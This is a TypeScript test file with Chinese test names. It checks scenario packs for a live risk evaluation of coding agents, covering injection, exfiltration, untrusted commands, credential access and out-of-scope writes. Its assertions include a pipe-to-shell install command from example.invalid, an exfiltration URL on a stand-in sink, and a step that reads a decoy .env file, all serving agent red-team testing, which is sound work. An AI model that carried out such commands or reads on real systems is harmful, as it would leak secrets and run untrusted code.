import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as packs from './pack.js';
import { LIVE_RISK_TYPE_IDS } from '../../../../../packages/shared/src/fleet-live-eval.js';
import { validateScenarioPack, buildJobPayload } from '../fleet-agent/checksum.js';
import { CHECK_CATALOG } from '../fleet-admin/check-catalog.js';

test('重测只生成指定场景，拒绝未知、不匹配、重复和空场景列表', () => {
  const id = 'endpoint-readme-injection';
  const pack = packs.buildEndpointPack('https://test.invalid/sink/token', ['exfiltration'], [id]);
  assert.deepEqual(pack.scenarios.map((s) => s.scenario_id), [id]);
  for (const ids of [[], ['unknown'], [id, id], ['endpoint-workspace-escape']]) {
    assert.throws(() => packs.buildEndpointPack('https://test.invalid/sink/token', ['exfiltration'], ids), /场景/);
  }
});

test('脚本包覆盖六类风险，第一步为非危险读取，其余危险步骤经过真实工具', () => {
  assert.equal(typeof packs.buildScriptedPack, 'function');
  const pack = packs.buildScriptedPack('https://test.invalid/sink/token');
  assert.equal(pack.mode, 'scripted');
  assert.equal(pack.scenarios.length, 6);
  assert.equal(validateScenarioPack(pack), null);
  assert.equal(JSON.parse(buildJobPayload('codex', pack, 'https://test.invalid/sink/token').canonical).scenario_pack.mode, 'scripted');
  assert.deepEqual(new Set(pack.scenarios.map((s) => s.risk_type)), new Set(LIVE_RISK_TYPE_IDS));
  for (const scenario of pack.scenarios) {
    assert.match(scenario.scenario_id, /^endpoint-scripted-/);
    assert.equal(scenario.driver, 'scripted');
    assert.equal(scenario.steps?.[0]?.tool, 'Read');
    assert.equal(scenario.steps?.[0]?.dangerous, false);
    assert.equal(scenario.steps?.[0]?.input.file_path, scenario.fixtures[0]?.path);
    assert.ok(scenario.steps!.slice(1).every((step) => step.dangerous));
    assert.deepEqual(scenario.steps!.map((step) => step.step), [1, 2]);
    if (['out_of_scope_write', 'indirect_instruction'].includes(scenario.risk_type!)) {
      assert.equal(scenario.external_fixtures?.length, 1);
      assert.ok(scenario.judgement_targets?.includes(scenario.external_fixtures![0]!.path));
    }
  }
  const exfil = pack.scenarios.find((s) => s.risk_type === 'exfiltration')!;
  assert.match(String(exfil.steps![1]!.input.command), /https:\/\/test.invalid\/sink\/token\/exfil/);
  const command = pack.scenarios.find((s) => s.risk_type === 'untrusted_command')!;
  assert.match(String(command.steps![1]!.input.command), /https:\/\/example.invalid\/install.sh \| sh/);
  assert.equal(pack.scenarios.find((s) => s.risk_type === 'credential_access')!.steps![1]!.input.file_path, '.env.lse-decoy');
});

test('脚本包按风险和场景筛选，目录公布每类脚本场景数', () => {
  const pack = packs.buildScriptedPack('https://test.invalid/sink/token', ['exfiltration']);
  assert.equal(pack.scenarios.length, 1);
  const id = pack.scenarios[0]!.scenario_id;
  assert.equal(packs.buildScriptedPack('https://test.invalid/sink/token', undefined, [id]).scenarios.length, 1);
  assert.throws(() => packs.buildScriptedPack('https://test.invalid', undefined, ['endpoint-readme-injection']), /场景/);
  for (const item of CHECK_CATALOG.liveRiskTypes) assert.equal(item.scriptedScenarioCount, 1);
});
